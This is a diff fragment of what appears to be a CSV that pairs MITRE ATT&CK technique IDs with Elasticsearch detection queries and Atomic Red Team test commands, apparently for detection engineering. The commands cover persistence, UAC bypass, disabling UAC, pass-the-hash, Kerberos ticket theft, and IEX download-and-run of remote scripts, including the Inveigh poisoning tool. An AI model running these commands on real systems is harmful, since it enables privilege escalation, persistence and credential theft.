+        ""bool"": {
+            ""must"": [
+                {""match_phrase"": {""CommandLine"": ""Copy-Item""}},
+                {""wildcard"": {""CommandLine"": ""*.sdb""}}            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}",Copy-Item df9e44_T1546.011CompatDatabase.sdb C:\Windows\apppatch\Custom\T1546.011CompatDatabase.sdb; Copy-Item df9e44_T1546.011CompatDatabase.sdb C:\Windows\apppatch\Custom\Custom64\T1546.011CompatDatabase.sdb,,2,
+T1546.011,"                                  {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"": {""CommandLine"": ""New-ItemProperty""}},
+                   {""match_phrase"": {""CommandLine"": ""Windows NT\\CurrentVersion\\AppCompatFlags\\Custom""}},
+                  {""match_phrase"": {""CommandLine"": ""Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB""}}
+
+           ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","New-ItemProperty -Path HKLM:""\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom"" -Name ""AtomicRedTeamT1546.011"" -Value ""AtomicRedTeamT1546.011""; New-ItemProperty -Path HKLM:""\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB"" -Name ""AtomicRedTeamT",,2,
+T1546.012,"                                  {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                 {""match_phrase"":{""CommandLine"": ""REG ADD""}},
+                {""match_phrase"": {""CommandLine"": ""Windows NT\\CurrentVersion\\Image""}},
+                {""match"": {""CommandLine"": ""Debugger""}},
+                {""match"": {""CommandLine"": ""Options""}}
+                            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}"" /v Debugger /d ""#{payload_binary}""",,2,
+T1546.012,"
+{
+    ""query"": {
+        ""bool"": {       
+            ""must"": [
+                {""bool"":{
+     ""must"":[
+                  {""match_phrase"":{""CommandLine"": ""REG ADD""}},
+                   {""match_phrase"":{""CommandLine"": ""Windows NT\\CurrentVersion""}},
+                  
+                          
+                ]
+     }
+    },
+    {""bool"":{
+     ""should"":[ 
+                {""match"": {""CommandLine"": ""GlobalFlag""}},
+                {""match"": {""CommandLine"": ""MonitorProcess""}},
+                {""match"": {""CommandLine"": ""ReportingMode""}}
+                     ]
+     }
+    }
+                 ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}"" /v GlobalFlag /t REG_DWORD /d 512 
+&& REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}"" /v ReportingMode /t REG_DWORD /d 1 
+&& REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}"" /v MonitorProcess /d ""#{payload_binary}""",2,,
+T1546.013,"                                  {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"": {""CommandLine"": ""Add-Content""}},
+                {""match_phrase"": {""CommandLine"": ""Start-Process""}},
+                {""match"": {""CommandLine"": ""powershell""}}            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","Add-Content $profile -Value """"; Add-Content $profile -Value ""Start-Process calc.exe""; powershell -Command exit",2,,
+T1546.015,"                                  {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"": {""CommandLine"": ""New-Item""}},
+                {""match_phrase"": {""CommandLine"": ""New-ItemProperty""}},
+                 {""match_phrase"": {""CommandLine"": ""Classes\\CLSID\\""}},
+                {""match_phrase"": {""CommandLine"": ""Start-Process""}}            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}' -Value 'MSAA AccPropServices'; New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\InprocServer32' -Value $env:TEMP\AtomicTest.dll; New-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\InprocServer32' -Name 'ThreadingModel' -Value 'Apartment' -PropertyType ""String""; Start-Process -FilePath ""C:\Windows\System32\RUNDLL32.EXE"" -ArgumentList '-sta {B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}'",,,
+T1546.015,"                                  {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""wildcard"": {""CommandLine"": ""*.Document.Application.ShellExecute""}},
+                {""match_phrase"": {""CommandLine"": ""GetTypeFromCLSID""}}            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","$o= [activator]::CreateInstance([type]::GetTypeFromCLSID(""9BA05972-F6A8-11CF-A442-00A0C90A8F39"")); $item = $o.Item(); $item.Document.Application.ShellExecute(""cmd.exe"",""/c calc.exe"",""C:\windows\system32"",$null,0)",2,,
+T1547,"                                  {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"": {""CommandLine"": ""add-driver""}},
+                 {""wildcard"": {""CommandLine"": ""*.inf""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","pnputil.exe /add-driver ""C:\Windows\INF\usbstor.inf""",2,,
+T1547.001,"                                  {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"": {""CommandLine"": ""WScript.Shell""}},
+                {""wildcard"": {""CommandLine"": ""*CreateShortcut""}},
+                {""wildcard"": {""CommandLine"": ""*TargetPath""}},
+                 {""wildcard"": {""CommandLine"": ""calc*""}},
+                 {""wildcard"": {""CommandLine"": ""*.Save""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","$Target = ""C:\Windows\System32\calc.exe""; 
+$ShortcutLocation = ""$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\calc_exe.lnk""; 
+$WScriptShell = New-Object -ComObject WScript.Shell; 
+$Create = $WScriptShell.CreateShortcut($ShortcutLocation); $Create.TargetPath = $Target; $Create.Save()",2,,
+T1547.001,"                                  {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"":{""CommandLine"": ""REG ADD""}},
+                 {""match_phrase"": {""CommandLine"": ""shell\\open\\command""}}
+               ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","reg ADD ""HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command"" /ve /d ""calc.exe"" /f",2,,
+T1547.001,"                                  {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"": {""CommandLine"": ""set-itemproperty""}},
+                 {""match"": {""CommandLine"": ""IEX""}},
+                {""wildcard"": {""CommandLine"": ""*.bat""}}
+               ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","$RunOnceKey = ""HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce""; set-itemproperty $RunOnceKey ""NextRun"" 'powershell.exe ""IEX (New-Object Net.WebClient).DownloadString(`""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/36f83b728bc26a49eacb0535edc42be8c377ac54/ARTifacts/Misc/Discovery.bat`"")""'",2,,
+T1547.001,"                                  {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"":{""CommandLine"": ""REG ADD""}},
+                {""wildcard"": {""CommandLine"": ""*.exe""}},
+                 {""match_phrase"": {""CommandLine"": ""Microsoft\\Windows\\CurrentVersion\\Run""}}
+               ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","REG ADD ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /V ""Atomic Red Team"" /t REG_SZ /F /D ""C:\Path\AtomicRedTeam.exe""",2,,
+T1547.001,"                                  {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"":{""CommandLine"": ""REG ADD""}},
+                
+                {""match_phrase"": {""CommandLine"": ""Microsoft\\Windows\\CurrentVersion""}},
+                {""wildcard"": {""CommandLine"": ""*.dll""}}
+              ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""C:\Path\AtomicRedTeam.dll""",2,,
+T1547.001,"                                  {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"": {""CommandLine"": ""Copy-Item""}},
+                 {""match_phrase"": {""CommandLine"": ""Microsoft\\Windows\\Start Menu\\Programs\\Startup""}},
+                {""wildcard"": {""CommandLine"": ""*.bat""}},
+                {""match_phrase"":{""CommandLine"": ""Start-Process""}}
+              ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","Copy-Item bea90a_batstartup.bat ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat""; 
+Copy-Item bea90a_batstartup.bat ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat""; 
+Start-Process ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat""; 
+Start-Process ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat""",2,,
+T1547.001,"                                  {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"": {""CommandLine"": ""Copy-Item""}},
+                  {""match_phrase"": {""CommandLine"": ""Microsoft\\Windows\\Start Menu\\Programs\\Startup""}},
+                {""wildcard"": {""CommandLine"": ""*jse""}},
+                {""wildcard"": {""CommandLine"": ""cscript*""}}
+              ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","Copy-Item d2a901_jsestartup.jse ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse""; 
+Copy-Item d2a901_jsestartup.jse ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse"";
+ cscript.exe /E:Jscript ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse""; 
+cscript.exe /E:Jscript ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse""",2,,
+T1547.001,"                                  {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"": {""CommandLine"": ""Copy-Item""}},
+                {""match_phrase"": {""CommandLine"": ""Microsoft\\Windows\\Start Menu\\Programs\\Startup""}},
+                {""wildcard"": {""CommandLine"": ""*vbs""}},
+                {""wildcard"": {""CommandLine"": ""cscript*""}}
+              ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","Copy-Item b6dec5_vbsstartup.vbs ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs"";
+Copy-Item b6dec5_vbsstartup.vbs ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs""; 
+cscript.exe ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs"";
+ cscript.exe ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs""",2,,
+T1547.001,"{
+    ""query"": {
+        ""bool"": {       
+            ""must"": [
+                {""bool"":{
+     ""must"":[
+                        {""match_phrase"":{""CommandLine"": ""Windows\\CurrentVersion\\Run""}},
+                        {""match_phrase"":{""CommandLine"": ""Set-ItemProperty""}}
+       ]
+     }
+    },
+    {""bool"":{
+     ""should"":[
+                        {""match"": {""CommandLine"": ""hidden""}},
+                        {""match"": {""CommandLine"": ""Bypass""}}
+      ]
+     }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","$RunKey = ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Run""; 
+Set-ItemProperty -Path $RunKey -Name ""socks5_powershell"" -Value ""powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File""",2,,
+T1547.002,"                                  {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"": {""CommandLine"": ""REG_MULTI_SZ""}},
+                 {""match_phrase"": {""CommandLine"": ""CurrentControlSet\\Control\\Lsa""}},
+                {""wildcard"": {""CommandLine"": ""*dll""}},
+                {""wildcard"": {""CommandLine"": ""reg*""}},
+                 {""match"": {""CommandLine"": ""add""}},
+                  {""match"": {""CommandLine"": ""Copy-Item""}}
+              ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","Copy-Item 864d47_package.dll C:\Windows\System32\; 
+reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa"" /v ""Authentication Packages"" /t REG_MULTI_SZ /d ""msv1_0\0package.dll"" /f",2,,
+T1547.004,"                                  {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"": {""CommandLine"": ""Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify""}},
+                 {""match"": {""CommandLine"": ""logon""}},
+                {""wildcard"": {""CommandLine"": ""*dll""}}              ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","New-Item ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify"" -Force; 
+Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify"" ""logon"" ""C:\Windows\Temp\atomicNotificationPackage.dll"" -Force",2,,
+T1547.004,"                                  {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"": {""CommandLine"": ""Microsoft\\Windows NT\\CurrentVersion\\Winlogon""}},
+                  {""match_phrase"": {""CommandLine"": ""Windows\\System32\\cmd.exe""}},
+                {""match"": {""CommandLine"": ""Shell""}} ,
+                               ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\""
+""Shell"" ""explorer.exe, C:\Windows\System32\cmd.exe"" -Force",2,,
+T1547.005,"                                  {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                   {""match_phrase"": {""CommandLine"":""Security Packages""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","$SecurityPackages = Get-ItemProperty HKLM:\System\CurrentControlSet\Control\Lsa -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages'; $SecurityPackagesUpdated = $SecurityPackages; $SecurityPackagesUpdated += ""not-a-ssp""; 
+Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value $SecurityPackagesUpdated; 
+Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value $SecurityPackages",2,,
+T1547.009,"                                  {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""wildcard"": {""CommandLine"": ""*lnk""}},
+                {""wildcard"": {""CommandLine"": ""*CreateShortcut""}},
+                {""wildcard"": {""CommandLine"": ""*TargetPath""}},
+                 {""wildcard"": {""CommandLine"": ""*WorkingDirectory""}},
+                 {""wildcard"": {""CommandLine"": ""*Save""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","$Shell = New-Object -ComObject (""WScript.Shell"");
+$ShortCut = $Shell.CreateShortcut(""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1547.009.lnk""); 
+$ShortCut.TargetPath=""cmd.exe""; $ShortCut.WorkingDirectory = ""C:\Windows\System32""; $ShortCut.WindowStyle = 1; 
+$ShortCut.Description = ""T1547.009.""; $ShortCut.Save(); $Shell = New-Object -ComObject (""WScript.Shell""); $ShortCut = $Shell.CreateShortcut(""$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1547.009.lnk"");
+ $ShortCut.TargetPath=""cmd.exe""; $ShortCut.WorkingDirectory = ""C:\Windows\System32""; $ShortCut.WindowStyle = 1; 
+$ShortCut.Description = ""T1547.009.""; $ShortCut.Save()",0,,
+T1547.009,"                                  {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match"": {""CommandLine"": ""echo""}},
+                {""match"": {""CommandLine"": ""&gt;""}},
+                {""wildcard"": {""CommandLine"":""*.url""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","echo [InternetShortcut] > %temp%\T1547.009_modified_shortcut.url && echo URL=C:\windows\system32\calc.exe 
+>> %temp%\T1547.009_modified_shortcut.url && %temp%\T1547.009_modified_shortcut.url",2,,
+T1547.010,"                                  {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                
+                 {""wildcard"": {""CommandLine"": ""*dll""}},
+                  {""match_phrase"": {""CommandLine"": ""\\currentcontrolset\\control\\print\\monitors\\ART""}},
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","reg add ""hklm\system\currentcontrolset\control\print\monitors\ART"" /v ""Atomic Red Team"" /d ""C:\Path\AtomicRedTeam.dll"" /t REG_SZ",,,
+T1548.002,"                                  {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match"": {""CommandLine"": ""mkdir""}},
+                {""match"": {""CommandLine"": ""copy""}},
+                {""match"": {""CommandLine"": ""mklink""}},
+                {""wildcard"": {""CommandLine"": ""*.exe""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","mkdir ""\\?\C:\Windows \System32\"" && copy ""C:\Windows\System32\cmd.exe"" ""\\?\C:\Windows \System32\mmc.exe"" 
+&& mklink c:\testbypass.exe ""\\?\C:\Windows \System32\mmc.exe""",2,,
+T1548.002,"                                  {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""wildcard"": {""CommandLine"": ""*.exe""}},
+                  {""match_phrase"": {""CommandLine"": ""classes\\mscfile\\shell\\open\\command""}},
+                {""match_phrase"": {""CommandLine"": ""Start-Process""}}            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","New-Item ""HKCU:\software\classes\ms-settings\shell\open\command"" -Force; 
+New-ItemProperty ""HKCU:\software\classes\ms-settings\shell\open\command"" -Name ""DelegateExecute"" -Value """" -Force; 
+Set-ItemProperty ""HKCU:\software\classes\ms-settings\shell\open\command"" -Name ""(default)"" -Value ""C:\Windows\System32\cmd.exe"" -Force; 
+Start-Process ""C:\Windows\System32\ComputerDefaults.exe""",,,
+T1548.002,"                                  {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"": {""CommandLine"": ""classes\\mscfile\\shell\\open\\command""}},
+                {""match_phrase"": {""CommandLine"": ""eventvwr.msc""}},
+                    {""match_phrase"": {""CommandLine"": ""Set-ItemProperty""}}
+    ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","New-Item ""HKCU:\software\classes\mscfile\shell\open\command"" -Force;
+ Set-ItemProperty ""HKCU:\software\classes\mscfile\shell\open\command"" -Name ""(default)"" -Value ""C:\Windows\System32\cmd.exe"" -Force; 
+Start-Process ""C:\Windows\System32\eventvwr.msc""",,,
+T1548.002,"                                  {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""wildcard"": {""CommandLine"": ""reg*""}},
+                  {""wildcard"": {""CommandLine"": ""add""}},
+                {""match_phrase"": {""CommandLine"": ""eventvwr.msc""}}            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ""C:\Windows\System32\cmd.exe"" /f 
+&& cmd.exe /c eventvwr.msc",2,,
+T1548.002,"                                  {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                 {""wildcard"": {""CommandLine"": ""reg*""}},
+                    {""match"": {""CommandLine"": ""add""}},
+               {""match_phrase"": {""CommandLine"": ""\\classes\\ms-settings\\shell\\open\\command""}},
+                {""match"": {""CommandLine"": ""DelegateExecute""}}            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d ""C:\Windows\System32\cmd.exe"" /f && reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v ""DelegateExecute"" /f && fodhelper.exe",,,
+T1548.002,"                                  {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+               {""match_phrase"": {""CommandLine"":""Classes\\Folder\\shell\\open\\command""}}, 
+                  {""match_phrase"": {""CommandLine"": ""Start-Process""}}            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","New-Item ""HKCU:\software\classes\ms-settings\shell\open\command"" -Force; 
+New-ItemProperty ""HKCU:\software\classes\ms-settings\shell\open\command"" -Name ""DelegateExecute"" -Value """" -Force; 
+Set-ItemProperty ""HKCU:\software\classes\ms-settings\shell\open\command"" -Name ""(default)"" -Value ""C:\Windows\System32\cmd.exe"" -Force; 
+Start-Process ""C:\Windows\System32\fodhelper.exe""",,,
+T1548.002,"                                  {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"": {""CommandLine"":""Classes\\Folder\\shell\\open\\command""}}, 
+                {""match_phrase"": {""CommandLine"": ""Start-Process""}},
+                {""match_phrase"": {""CommandLine"": ""sdclt.exe""}}
+           ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","New-Item -Force -Path ""HKCU:\Software\Classes\Folder\shell\open\command"" -Value 'cmd.exe /c notepad.exe';
+ New-ItemProperty -Force -Path ""HKCU:\Software\Classes\Folder\shell\open\command"" -Name ""DelegateExecute""; 
+Start-Process -FilePath $env:windir\system32\sdclt.exe; Start-Sleep -s 3",2,,
+T1548.002,"                                  {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""wildcard"": {""CommandLine"": ""reg*""}},
+                {""match"": {""CommandLine"": ""ADD""}},
+                {""match_phrase"": {""CommandLine"": ""EnableLUA""}}
+           ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}",reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f,2,,
+T1548.002,"                                  {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match"": {""CommandLine"": "" Akagi64""}},
+                {""match_phrase"": {""CommandLine"": "" \\uacme\\23""}}   
+           ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","""%temp%\uacme\23 Akagi64.exe""",2,,
+T1550.002,"                                  {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""wildcard"": {""CommandLine"": ""crackmapexec*""}},
+                {""match"": {""CommandLine"": ""Administrator""}},
+                {""match"": {""CommandLine"": ""whoami""}}
+                
+           ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","C:\CrackMapExecWin\crackmapexec.exe %userdnsdomain% -u 
+Administrator -H cc36cf7a8514893efccd3324464tkg1a -x whoami",2,,
+T1550.003,"                                  {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"": {""CommandLine"": ""ticket.kirbi""}},
+                 {""match"": {""CommandLine"": ""ptt""}},
+                {""match_phrase"": {""CommandLine"": ""Move-Item""}}          ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","C:\PSTools\PsExec.exe -accepteula \\localhost -w c:\ -c $Env:TEMP\rubeus.exe asktgt /user:Administrator /password:Password /domain:$Env:USERDOMAIN /outfile:ticket.kirbi; 
+Set-Location $env:TEMP; 
+Move-Item -Force ""\\localhost\c$\ticket.kirbi"" ticket.kirbi; 
+Write-Host ""Successfully retrieved TGT from 'localhost', now requesting a TGS from local""; 
+& ""$Env:TEMP\rubeus.exe"" asktgs /service:cifs/localhost /ticket:ticket.kirbi /ptt;
+ Remove-Item $env:TEMP\ticket.kirbi; & ""$Env:TEMP\rubeus.exe"" purge",2,,
+T1556.002,"                                  {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"": {""CommandLine"": ""Copy-Item""}},
+                {""match"": {""CommandLine"": ""-Destination""}},
+                {""match"": {""CommandLine"": ""-PassThru""}},
+                {""wildcard"": {""CommandLine"": ""*basename""}},
+                {""match_phrase"": {""CommandLine"": ""Restart-Computer""}}            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","$passwordFilterName = (Copy-Item ""PathToAtomicsFolder\T1556.002\src\AtomicPasswordFilter.dll"" -Destination ""C:\Windows\System32"" -PassThru).basename; 
+$lsaKey = Get-Item ""HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\""; 
+$notificationPackagesValues = $lsaKey.GetValue(""Notification Packages""); $notificationPackagesValues += $passwordFilterName; Set-ItemProperty ""HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"" ""Notification Packages"" $notificationPackagesValues; Restart-Computer -Confirm",2,,
+T1557.001,"                                  {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"": {""CommandLine"": ""Invoke-Inveigh""}},
+                {""match"": {""CommandLine"": ""-ConsoleOutput""}},  
+                 {""match"": {""CommandLine"": ""-HTTPS""}}           ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr ""https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh.ps1"" -UseBasicParsing); Invoke-Inveigh -ConsoleOutput Y -NBNS Y -MDNS Y -HTTPS Y -PROXY Y",2,,
+T1574.001,"                                  {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match"": {""CommandLine"": ""copy""}},
+              
+           
+                {""match_phrase"": {""CommandLine"": ""amsi.dll""}}  
+          ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}",copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\updater.exe && copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll && %APPDATA%\updater.exe -Command exit,,,
+T1574.009,"                                  {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match"": {""CommandLine"": ""copy""}},
+                {""match"": {""CommandLine"": ""binpath""}},
+                {""match_phrase"": {""CommandLine"": ""\\Program Files\\windows_service.exe""}},
+                  {""match_phrase"": {""CommandLine"": ""sc create""}},
+                {""match_phrase"": {""CommandLine"": ""sc start""}}            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","copy 0655d1_WindowsServiceExample.exe ""C:\Program Files\windows_service.exe"" && copy 0655d1_WindowsServiceExample.exe ""C:\program.exe"" && sc create ""Example Service"" binpath= ""C:\Program Files\windows_service.exe"" Displayname= ""Example Service"" start= auto && sc start ""Example Service""",2,,
+T1574.011,"                                  {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"": {""CommandLine"": ""reg.exe add""}},
+                 {""match_phrase"": {""CommandLine"": ""CurrentControlSet\\Services\\calcservice""}},
+                {""match"": {""CommandLine"": ""ImagePath""}}
+           ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Services\calcservice"" /f /v ImagePath /d ""%windir%\system32\cmd.exe""",2,,
+T1574.011,"                                  {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"": {""CommandLine"": ""get-acl""}},
+                 {""match_phrase"": {""CommandLine"": ""\\CurrentControlSet\\Services\\""}},
+                  {""match"": {""CommandLine"": ""FL""}},
+                        ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\* |FL;
+ get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\weakservicename |FL",2,,
+T1574.012,"                                  {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""wildcard"": {""CommandLine"": ""*dll""}}, 
+               
+                 {""match_phrase"": {""CommandLine"": ""Start-Sleep""}}
+           ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","$env:COR_ENABLE_PROFILING = 1; $env:COR_PROFILER = '{09108e71-974c-4010-89cb-acf471ae9e2c}'; $env:COR_PROFILER_PATH = '83f016_T1574.012x64.dll'; 
+POWERSHELL -c 'Start-Sleep 1'",(?),,
+T1574.012,"                                  {
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"": {""CommandLine"": ""Write-Host""}},
+                {""match_phrase"": {""CommandLine"": ""COR_ENABLE_PROFILING""}},
+                 {""match_phrase"": {""CommandLine"": ""CurrentControlSet\\Control\\Session Manager\\Environment""}}
+           ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","Write-Host ""Creating system environment variables"" -ForegroundColor Cyan; 
+New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name ""COR_ENABLE_PROFILING"" -PropertyType String -Value ""1"" -Force | Out-Null; 
